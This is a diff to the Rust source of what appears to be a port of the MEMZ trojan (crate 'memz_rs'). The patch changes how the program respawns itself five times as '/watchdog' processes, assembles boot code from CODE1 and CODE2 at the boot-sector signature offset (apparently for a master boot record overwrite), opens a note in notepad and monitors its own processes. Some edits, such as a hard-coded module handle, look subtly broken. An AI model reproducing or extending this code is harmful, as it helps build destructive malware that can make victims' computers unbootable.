@@ -1,5 +1,5 @@
 use memz_rs::{
-    convert_str::ToPCSTRWrapper,
+    convert_str::{ToPCSTRWrapper},
     data::{
         self,
         code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
@@ -12,7 +12,7 @@ use memz_rs::{
     utils::log::{self, write_log, LogLocation, LogType},
     winapi_type::DWORD,
     wrap_windows_api::*,
-    LMEM_ZEROINIT, s_v,
+    LMEM_ZEROINIT, s_v, MEM_ZEROINIT,
 };
 use std::{
     mem::size_of,
@@ -21,7 +21,7 @@ use std::{
     time::Duration,
 };
 use windows::{
-    core::PCSTR,
+    core::{PCSTR, PCWSTR},
     Win32::{
         Foundation::{
             GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND,
@@ -35,7 +35,7 @@ use windows::{
         },
         System::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION, GetCurrentProcessId, PROCESS_QUERY_LIMITED_INFORMATION},
+            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
         },
         UI::{
             Shell::{SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
@@ -132,46 +132,22 @@ fn main() -> Result<(), WinError> {
             process::exit(0);
         }
 
-        let pid = unsafe {
-            GetCurrentProcessId()
-        };
-
-        let handle;
-        unsafe {
-            handle = match OpenProcess(
-                PROCESS_QUERY_LIMITED_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
-                FALSE,
-                pid,
-            ) {
-                Ok(handle) => Some(handle),
-                Err(e) => {
-                    let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
-                    write_log(
-                        LogType::ERROR,
-                        LogLocation::ALL,
-                        &format!("{}\n{}\n", data, dbg!(&e)),
-                    );
-                    None
-                }
-            };
-        }
-
         let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
         wrap_get_module_file_name(
-            handle.unwrap(),
+            HANDLE::default(),
             HMODULE(8192_isize),
             fn_buf.as_mut_slice(),
         )?;
 
-        let path = std::str::from_utf8(&fn_buf).unwrap();
+        let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
 
         for _ in 0..5 {
-            wrap_shell_execute_a(
+            wrap_shell_execute_w(
                 HWND(0),
-                PCSTR::null(),
-                *path.to_pcstr(),
-                *"/watchdog".to_pcstr(),
-                PCSTR::null(),
+                PCWSTR::null(),
+                path.as_str(),
+                "/watchdog",
+                PCWSTR::null(),
                 SW_SHOWDEFAULT,
             )?;
         }
@@ -181,7 +157,7 @@ fn main() -> Result<(), WinError> {
             fMask: SEE_MASK_NOCLOSEPROCESS,
             hwnd: HWND(0),
             lpVerb: PCSTR::null(),
-            lpFile: *path.to_pcstr(),
+            lpFile: *path.as_str().to_pcstr(),
             lpParameters: *"/main".to_pcstr(),
             lpDirectory: PCSTR::null(),
             nShow: SW_SHOWDEFAULT.0 as i32,
@@ -205,7 +181,7 @@ fn main() -> Result<(), WinError> {
     )
     .unwrap();
 
-    let mut boot_code = vec![LMEM_ZEROINIT; 65536];
+    let mut boot_code = vec![MEM_ZEROINIT; 65536];
     boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
     boot_code[0x1fe..(0x1fe + CODE2_LEN)].copy_from_slice(&CODE2[..CODE2_LEN]);
 
@@ -260,12 +236,12 @@ fn main() -> Result<(), WinError> {
 
     wrap_close_handle(note)?;
 
-    wrap_shell_execute_a(
+    wrap_shell_execute_w(
         HWND::default(),
-        PCSTR::null(),
+        PCWSTR::null(),
         "notepad",
         "\\note.txt",
-        PCSTR::null(),
+        PCWSTR::null(),
         SW_SHOWDEFAULT,
     )?;
 
@@ -282,7 +258,7 @@ fn main() -> Result<(), WinError> {
 
 fn watchdog_thread() -> Result<(), WinError> {
     let mut oproc = 0;
-    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+    let mut f_buf1: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
     wrap_get_process_image_filename_a(&mut f_buf1)?;
     #[cfg(feature = "DEBUG_MODE")]
     {
@@ -369,7 +345,7 @@ fn watchdog_thread() -> Result<(), WinError> {
                 );
                 sleep(Duration::from_millis(500));
             }
-            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+            let mut f_buf2: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
             wrap_get_process_image_filename_a(&mut f_buf2)?;
             #[cfg(feature = "DEBUG_MODE")]
             {
